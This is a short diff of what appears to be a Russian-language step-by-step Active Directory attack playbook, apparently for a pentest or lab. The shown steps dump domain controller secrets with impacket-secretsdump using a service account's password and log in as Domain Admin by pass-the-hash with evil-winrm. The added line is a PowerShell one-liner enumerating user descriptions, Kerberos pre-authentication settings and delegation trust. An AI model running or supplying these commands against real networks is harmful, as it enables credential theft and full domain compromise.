@@ -33,6 +33,9 @@ impacket-secretsdump svc_backupagent:'Welcome2024!'@$DC
 # === ШАГ 6: Заходим как Domain Admin (10 мин) ===
 evil-winrm -i $DC -u Administrator -H <ВСТАВЬ_NTLM_ХЕШ_ИЗ_ШАГА_5>
 
+
+Get-ADUser -Filter * -Properties Description,DoesNotRequirePreAuth | ft SamAccountName,Enabled,Description,DoesNotRequirePreAuth -AutoSize ; Write-Host "--- svc_backupagent groups ---" ; Get-ADPrincipalGroupMembership svc_backupagent | ft Name -AutoSize ; Write-Host "--- FILE-SRV01 delegation ---" ; Get-ADComputer FILE-SRV01 -Properties TrustedForDelegation | ft Name,TrustedForDelegation -AutoSize
+
 # Проверяем:
 whoami /all
 net user /domain
